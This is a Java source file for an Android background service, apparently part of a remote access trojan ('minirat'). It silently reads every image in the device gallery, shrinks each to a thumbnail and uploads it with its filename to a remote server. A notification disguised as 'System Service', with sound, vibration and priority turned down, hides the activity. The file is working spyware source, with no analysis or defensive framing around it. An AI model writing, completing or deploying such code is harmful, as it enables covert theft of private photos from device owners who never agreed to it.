package com.app.minirat;

import com.app.minirat.BuildConfig;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.ContentResolver;
import android.content.ContentUris;
import android.content.Intent;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Matrix;
import android.net.Uri;
import android.os.Build;
import android.os.IBinder;
import android.os.ParcelFileDescriptor;
import android.provider.MediaStore;
import android.util.Base64;
import android.util.Log;

import androidx.core.app.NotificationCompat;

import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.FileDescriptor;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class Service extends android.app.Service {
    private static final String TAG = "Service";
    private static final String CHANNEL_ID = "ServiceChannel";
    private static final int NOTIFICATION_ID = 1;
    private static final String SERVER_URL = BuildConfig.DOMAIN_URL;

    private ExecutorService executor = Executors.newSingleThreadExecutor();

    // Container class for media items
    private static class MediaItem {
        final Uri uri;
        final String displayName;

        MediaItem(Uri uri, String displayName) {
            this.uri = uri;
            this.displayName = displayName;
        }
    }

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "Service started");

        // Start as a foreground service (required on Android 8+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForeground(NOTIFICATION_ID, createNotification());
        }

        // Run gallery scan once on the background executor
        uploadGalleryThumbnails();

        return START_STICKY;
    }

    private void uploadGalleryThumbnails() {
        executor.execute(() -> {
            try {
                ArrayList<MediaItem> mediaItems = getGalleryFiles();
                Log.d(TAG, "Found " + mediaItems.size() + " media items");

                for (MediaItem item : mediaItems) {
                    try {
                        String thumbnailBase64 = createThumbnail(item.uri);
                        if (thumbnailBase64 != null) {
                            sendThumbnailToServer(item.displayName, thumbnailBase64);
                            Log.d(TAG, "Uploaded thumbnail for: " + item.displayName);
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "Error processing: " + item.displayName, e);
                    }
                }

            } catch (Exception e) {
                Log.e(TAG, "Error getting gallery files", e);
            }
        });
    }

    private ArrayList<MediaItem> getGalleryFiles() {
        ArrayList<MediaItem> items = new ArrayList<>();

        // Query all images from the MediaStore
        queryImages(items);

        return items;
    }

    private void queryImages(ArrayList<MediaItem> items) {
        Cursor cursor = null;
        try {
            String[] projection = {
                    MediaStore.Images.Media._ID,
                    MediaStore.Images.Media.DISPLAY_NAME,
                    MediaStore.Images.Media.MIME_TYPE
            };

            // Query ALL image types — no MIME filter so we get JPEG, PNG, WEBP, GIF, HEIC, BMP, etc.
            cursor = getContentResolver().query(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    projection,
                    null,  // no selection — get all images
                    null,  // no selection args
                    MediaStore.Images.Media.DATE_ADDED + " DESC"
            );

            if (cursor != null) {
                int idColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID);
                int nameColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME);

                while (cursor.moveToNext()) {
                    long id = cursor.getLong(idColumn);
                    String displayName = cursor.getString(nameColumn);

                    // Build content URI (works on all Android versions including scoped storage)
                    Uri contentUri = ContentUris.withAppendedId(
                            MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id);

                    items.add(new MediaItem(contentUri, displayName));
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error querying images", e);
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
    }

    private String createThumbnail(Uri contentUri) throws IOException {
        ContentResolver resolver = getContentResolver();

        // First pass: decode bounds only to calculate inSampleSize
        BitmapFactory.Options opts = new BitmapFactory.Options();
        opts.inJustDecodeBounds = true;

        ParcelFileDescriptor pfd = resolver.openFileDescriptor(contentUri, "r");
        if (pfd == null) return null;
        BitmapFactory.decodeFileDescriptor(pfd.getFileDescriptor(), null, opts);
        pfd.close();

        int targetSize = 128;
        int inSampleSize = 1;
        if (opts.outHeight > targetSize || opts.outWidth > targetSize) {
            int halfHeight = opts.outHeight / 2;
            int halfWidth = opts.outWidth / 2;
            while ((halfHeight / inSampleSize) >= targetSize
                    && (halfWidth / inSampleSize) >= targetSize) {
                inSampleSize *= 2;
            }
        }

        // Second pass: decode actual bitmap with inSampleSize
        opts.inJustDecodeBounds = false;
        opts.inSampleSize = inSampleSize;

        pfd = resolver.openFileDescriptor(contentUri, "r");
        if (pfd == null) return null;
        Bitmap bitmap = BitmapFactory.decodeFileDescriptor(pfd.getFileDescriptor(), null, opts);
        pfd.close();

        if (bitmap == null) {
            return createPlaceholderThumbnail();
        }

        // Scale down to 128x128 preserving aspect ratio
        float scale = Math.min(
                (float) targetSize / bitmap.getWidth(),
                (float) targetSize / bitmap.getHeight()
        );

        Matrix matrix = new Matrix();
        matrix.postScale(scale, scale);

        Bitmap thumbnail = Bitmap.createBitmap(bitmap, 0, 0,
                bitmap.getWidth(), bitmap.getHeight(), matrix, true);

        if (thumbnail != bitmap) {
            bitmap.recycle();
        }

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        thumbnail.compress(Bitmap.CompressFormat.JPEG, 70, baos);
        byte[] thumbnailBytes = baos.toByteArray();
        baos.close();
        thumbnail.recycle();

        return Base64.encodeToString(thumbnailBytes, Base64.NO_WRAP);
    }

    private String createPlaceholderThumbnail() {
        Bitmap placeholder = Bitmap.createBitmap(128, 128, Bitmap.Config.RGB_565);
        placeholder.eraseColor(0xFFCCCCCC);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        placeholder.compress(Bitmap.CompressFormat.JPEG, 70, baos);
        byte[] placeholderBytes = baos.toByteArray();
        try {
            baos.close();
        } catch (IOException e) {
            Log.e(TAG, "Error closing ByteArrayOutputStream", e);
        }

        placeholder.recycle();

        return Base64.encodeToString(placeholderBytes, Base64.NO_WRAP);
    }

    private void sendThumbnailToServer(String fileName, String thumbnailBase64) {
        try {
            URL url = new URL(SERVER_URL + "/api/upload/thumbnail");
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json");
            connection.setDoOutput(true);
            connection.setConnectTimeout(10000);
            connection.setReadTimeout(10000);

            JSONObject payload = new JSONObject();
            payload.put("filename", fileName);
            payload.put("thumbnail", thumbnailBase64);

            byte[] postData = payload.toString().getBytes("UTF-8");
            connection.setFixedLengthStreamingMode(postData.length);

            DataOutputStream dos = new DataOutputStream(connection.getOutputStream());
            dos.write(postData);
            dos.flush();
            dos.close();

            int responseCode = connection.getResponseCode();
            Log.d(TAG, "Thumbnail upload response: " + responseCode);

            connection.disconnect();

        } catch (Exception e) {
            Log.e(TAG, "Error sending thumbnail to server", e);
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "System Service",
                    NotificationManager.IMPORTANCE_LOW
            );
            channel.setSound(null, null);
            channel.setVibrationPattern(new long[]{0});
            channel.setImportance(NotificationManager.IMPORTANCE_MIN);

            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }
    }

    private Notification createNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("System Service")
                .setContentText("Running in background")
                .setSmallIcon(R.drawable.ic_notification)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setCategory(NotificationCompat.CATEGORY_SERVICE)
                .setAutoCancel(false)
                .setOngoing(true)
                .build();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        Log.d(TAG, "Service destroyed");
        executor.shutdownNow();
        super.onDestroy();
    }
}
